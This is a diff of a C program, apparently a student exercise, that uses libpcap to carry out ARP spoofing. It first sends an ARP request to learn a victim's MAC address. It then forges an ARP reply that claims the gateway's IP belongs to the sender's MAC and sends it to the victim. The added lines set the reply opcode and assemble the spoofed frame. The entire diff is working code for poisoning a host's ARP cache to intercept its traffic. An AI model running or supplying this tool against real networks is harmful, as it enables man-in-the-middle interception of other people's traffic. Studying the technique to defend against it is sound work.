@@ -131,11 +131,6 @@ int print_packet(struct arp_packet * packet)
 	return 0;
 }
 
-int print_frame(unsigned char * frame)
-{
-//	for(int i=0; i<str
-}
-
 int main(int argc, char* argv[])
 {	
 	pcap_t *fp;
@@ -188,8 +183,8 @@ int main(int argc, char* argv[])
 
 	print_packet(packet);
 	
-	memcpy(frame, packet->ETH_hdr, sizeof(struct libnet_ethernet_hdr));
-	memcpy(frame+sizeof(struct libnet_ethernet_hdr), packet->ARP_hdr, sizeof(struct libnet_arp_hdr));
+	memcpy(frame, packet->ETH_hdr, sizeof(struct libnet_ethernet_hdr));						// ethernet hdr copy
+	memcpy(frame+sizeof(struct libnet_ethernet_hdr), packet->ARP_hdr, sizeof(struct libnet_arp_hdr));		// arp hdr copy
 	memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr), 
 		packet->src_hrd_addr, ETHER_ADDR_LEN);
 	memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN,
@@ -200,14 +195,14 @@ int main(int argc, char* argv[])
                 &packet->des_pro_addr, sizeof(struct in_addr));
 
 
-	if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)
+	if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)	// send packet
 	{
 		fprintf(stderr, "\nError sending the packet\n");
 		return -1;
 	}
 	
 	printf("--------send_arp!--------\nframe	 	: ");
-	for(int i=0; i<42;i++)
+	for(int i=0; i<42;i++)								// frame print
 		printf("%02x ", frame[i]);
 	printf("\n\n");			
 
@@ -225,7 +220,7 @@ int main(int argc, char* argv[])
 		printf("%u bytes captured\n", header->caplen);
 
 		ETH_header = (libnet_ethernet_hdr *)rcv_packet;
-		if(ntohs(ETH_header->ether_type) == 0x0806)			// ARP 일때  진행
+		if(ntohs(ETH_header->ether_type) == 0x0806)				// ARP 일때  진행
 			printf("ETH type : %04x	-> It's ARP!\n", ntohs(ETH_header->ether_type));
 		else {
 			continue;
@@ -243,20 +238,24 @@ int main(int argc, char* argv[])
 		if(strcmp(argv[2], inet_ntoa(*src_pro_addr)) == 0)
 		{
 			getIpAddress(&my_ip, argv[1]);
-			if(strcmp(my_ip, inet_ntoa(*des_pro_addr)) == 0)
+			if(strcmp(my_ip, inet_ntoa(*des_pro_addr)) == 0)		// src_pro_addr이 victim의 ip 주소이고 des_pro_addr이 내 ip 주소일 때
 			{
 				printf("--------correct packet!!---------\n--------victim mac get!!--------\n\n");
-				memcpy(victim_mac, src_hrd_addr, ETHER_ADDR_LEN);
+				memcpy(victim_mac, src_hrd_addr, ETHER_ADDR_LEN);	// victim mac get
 				break;
 			}
 		} 
-	}
-	
-	getMacAddress(my_mac, argv[1]);                                         // get my mac, ip
+	}	
+
         memcpy(packet->ETH_hdr->ether_dhost, victim_mac, ETHER_ADDR_LEN);     // dst mac : victim mac
+	getMacAddress(my_mac, argv[1]);                                         // get my mac, ip
         memcpy(packet->ETH_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
         memcpy(&packet->ETH_hdr->ether_type, &arp_type, 2);             // mac type : 0x0806
-	
+
+	arp_opcode = 0x0002;                                   		// reply
+        arp_opcode = ntohs(arp_opcode);	
+	memcpy(&packet->ARP_hdr->ar_op, &arp_opcode, 2);
+
         memcpy(packet->src_hrd_addr, my_mac, ETHER_ADDR_LEN);           // src hrd addr -> my mac
         getIpAddress(&my_ip, argv[1]);
         inet_pton(AF_INET, argv[3], &packet->src_pro_addr);             // src pro addr -> gateway ip
@@ -265,24 +264,25 @@ int main(int argc, char* argv[])
 
         print_packet(packet);
         
-	memcpy(frame, packet->ETH_hdr, sizeof(struct libnet_ethernet_hdr));
-        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN,
+	memcpy(frame, packet->ETH_hdr, sizeof(struct libnet_ethernet_hdr));					// ethernet hdr copy
+	memcpy(frame+sizeof(struct libnet_ethernet_hdr), packet->ARP_hdr, sizeof(struct libnet_arp_hdr));       // arp hdr copy
+        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN,	// src_pro_addr copy
                 &packet->src_pro_addr, sizeof(struct in_addr));
-        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN + sizeof(struct in_addr),
+        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN + sizeof(struct in_addr),	// des_hrd_addr copy
                 packet->des_hrd_addr, ETHER_ADDR_LEN);
 
-        if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)
+        if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)		// send packet
         {
                 fprintf(stderr, "\nError sending the packet\n");
                 return -1;
         }
 
 	printf("--------send_arp!--------\nframe		: ");
-        for(int i=0; i<42;i++)
+        for(int i=0; i<42;i++)						// print frame
                 printf("%02x ", frame[i]);
 	printf("\n");
 
-	free(packet->ETH_hdr);
+	free(packet->ETH_hdr);			// memory
 	free(packet->ARP_hdr);
 	free(packet);
 	free(sin);
